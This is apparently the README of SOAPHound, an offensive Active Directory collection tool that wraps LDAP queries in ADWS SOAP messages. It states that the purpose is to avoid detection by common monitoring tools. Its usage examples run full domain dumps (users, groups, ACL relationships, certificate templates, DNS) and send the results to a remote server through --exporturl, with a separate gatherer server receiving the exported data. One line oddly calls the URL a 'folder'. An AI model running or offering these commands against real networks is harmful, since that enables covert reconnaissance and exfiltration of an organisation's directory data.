![logo](soaphound-logo.png)

# Description

SOAPHound is a .NET data collector tool, which collects Active Directory data via the Active Directory Web Services (ADWS) protocol.

SOAPHound is an alternative to a number of open source security tools which are commonly used to extract Active Directory data via LDAP protocol. SOAPHound is able to extract the same information without directly communicating to the LDAP server. Instead, LDAP queries are wrapped within a series of SOAP messages, which are sent to the ADWS server using NET TCP Binding communication channel. Following, ADWS server unwraps the LDAP queries and forwards them to the LDAP server running on the same Domain Controller. As a result, LDAP traffic is not sent via the wire and therefore is not easily detected by common monitoring tools.

Note that this is a proof of concept tool and is not intended for production use. The tool is provided as is, without warranty of any kind.

For additional details on the SOAPHound tool, please refer to the following blog post: [SOAPHound — tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/).

# Usage

The `--help` command line argument can be used to display the following usage information:

```
SOAPHound
Copyright (c) 2024 FalconForce

Connection and authentication options:
  --user                   Username to use for ADWS Connection. Format: domain\user or user@domain
  --password               Password to use for ADWS Connection
  --domain                 Specify domain for enumeration
  --dc                     Domain Controller to connect to

Supported collection methods:
  --buildcache             (Default: false) Only build cache and not perform further actions
  --dnsdump                (Default: false) Dump AD Integrated DNS data
  --certdump               (Default: false) Dump AD Certificate Services data
  --bhdump                 (Default: false) Dump BH data

Output options:
  -u, --exporturl          URL to export outputs to 
  -i, --cacheid            Cache ID to use during dumps

Splitting options:
  -a, --autosplit          (Default: false) Enable AutoSplit mode: automatically split object retrieval on two depth levels based on defined trheshold
  -t, --threshold          (Default: 0) AutoSplit mode: Define split threshold based on number of objects per starting letter

Miscellaneous options:
  --nolaps                 (Default: false) Do not request LAPS related information
  --showstats              Show stats of local cache file
  --logfile                Create log file
  --help                   Display this help screen.
```

# Start the Gatherer Server

See `GathererServer/README.md` for instructions on how to start the server to gather exported logs.

# Connection and authentication options

## Authentication

SOAPHound supports the following authentication methods:
* Using the existing authentication token of the current user. This is the default option if no username and password are supplied.
* Supplying a username and password on the command line.

## Domain Connection Information

When SOAPHound runs in a domain-joined machine, it will automatically attempt to connect to the Domain Controller of the domain the machine is joined to. 
This can be overridden by supplying the `--dc` and `--domain` command line arguments.

# Supported collection methods

One of the following collection methods must be specified:
* `--buildcache`: Only build cache and not perform further actions
* `--bhdump`: Dump BloodHound data
* `--certdump`: Dump AD Certificate Services (ADCS) data
* `--dnsdump`: Dump AD Integrated DNS data


## Building the cache

SOAPHound is able to generate a cache file that contains basic information about all domain objects, such as Security Identifier (SID), Distinguished Name (DN) and ObjectClass. 
This cache file is required for BloodHound related data collection (i.e. the `--bhdump` and `--certdump` collection methods), since it is used when crafting the trust relationships between objects via the relevant Access Control Entries (ACEs).

An example command to build the cache file is:

```
SOAPHound.exe --buildcache --exporturl https://example.com
```

This will export the cache to the remote server and present you with a `cache id` which can be used in subsequent calls while dumping domain artefacts. Example output:

```
Z:\>SOAPHound.exe --buildcache  --exporturl https://example.com
-------------
Generating cache
ADWS request with ldapbase (DC=BRUCE,DC=local), ldapquery: (!soaphound=*) and ldapproperties: [objectSid, objectGUID, distinguishedName]
Generating cache complete
Exported cache to: https://example.com/cache?id=6X1s19lM07uh6G1mFZXDp21rzay97u5G
CACHE ID: 6X1s19lM07uh6G1mFZXDp21rzay97u5G
```

To view some statistics about the cache file (i.e. number of domain objects starting with each letter), you can use the `--showstats` command line argument:

```
SOAPHound.exe --showstats  --exporturl https://example.com --cacheid CACHE-ID
```

## Collecting BloodHound Data

After the cache file has been generated, you can use the `--bhdump` collection method to collect data from the domain that can be imported into BloodHound.

An example command to collect BloodHound data is (note that this references the cache file generated in the previous step):

```
SOAPHound.exe --cacheid CACHE-ID --bhdump --exporturl https://example.com
```

If the targeted domain does not use LAPS, you can use the `--nolaps` command line argument to skip the LAPS related data collection. 

This command will export the logs to `https://example.com` folder and produce a number of JSON files that can be imported into BloodHound. 
The JSON files contain the collected Users, Groups, Computers, Domains, GPOs and Containers, including their relationships. SOAPHound is compatible with Bloodhound version 4. 

### Dealing with large domains

If you are dealing with a large domain, you may run into issues with the amount of data that can be retrieved in a single request.
To deal with this, SOAPHound supports the `--autosplit` and `--threshold` command line arguments.

The `--autosplit` command line argument enables the AutoSplit mode, which will automatically split object retrieval on two depth levels based on a defined threshold.
The `--threshold` command line argument defines the split threshold based on the number of objects per starting letter.

An example command to collect BloodHound data in AutoSplit mode is:

```
SOAPHound.exe --cacheid CACHE-ID --bhdump --exporturl https://example.com --autosplit --threshold 1000
```

This will generate the output in batches of a maximum of 1000 objects per starting letter. 
If there are more than 1000 objects for a single starting letter, SOAPHound will use two depth levels to retrieve the objects.
This will result in larger number of queries, each one returning a maximum of 1000 objects.

For example if there are 2000 objects starting with the letter `a`, SOAPHound will retrieve objects
starting with `aa`, `ab`, `ac`, etc., each in a separate query to avoid timeouts.

## Collecting ADCS Data

After the cache file has been generated, you can use the `--certdump` collection method to collect ADCS data from the domain that can be imported into BloodHound.
This collection method does not support the `--autosplit` and `--threshold` command line arguments.

An example command to collect ADCS data is (note that this references the cache file generated in previous step):

```
SOAPHound.exe --cacheid CACHE-ID --certdump --exporturl https://example.com
```

This command will produce two JSON files that can be imported into BloodHound, containing information about the Certificate Authorities (CA) and Certificate Templates and export it to `https://example.com` . SOAPHound is compatible with Bloodhound version 4 and ADCS data are classified as GPO objects in Bloodhound.

## Collecting AD Integrated DNS Data

Apart from BloodHound data, SOAPHound can also be used to collect AD Integrated DNS data. This does not require a cache file and does not support the `--autosplit` and `--threshold` command line arguments.

An example command to collect AD Integrated DNS data is:

```
SOAPHound.exe --dnsdump --exporturl https://example.com
```

This command will export a dump of all the AD Integrated DNS data.

# Acknowledgements

This tool is based on the work of the following open source projects:
* [SharpHound](https://github.com/BloodHoundAD/SharpHound/tree/dev)
* [StandIn](https://github.com/FuzzySecurity/StandIn)
* [Certify](https://github.com/GhostPack/Certify)

Another big thanks to [PingCastle](https://github.com/vletoux/pingcastle) for their reference implementation of the ADWS protocol. 
While we do not use their code directly, it was a great help in understanding the protocol and realizing the potential of the ADWS protocol.
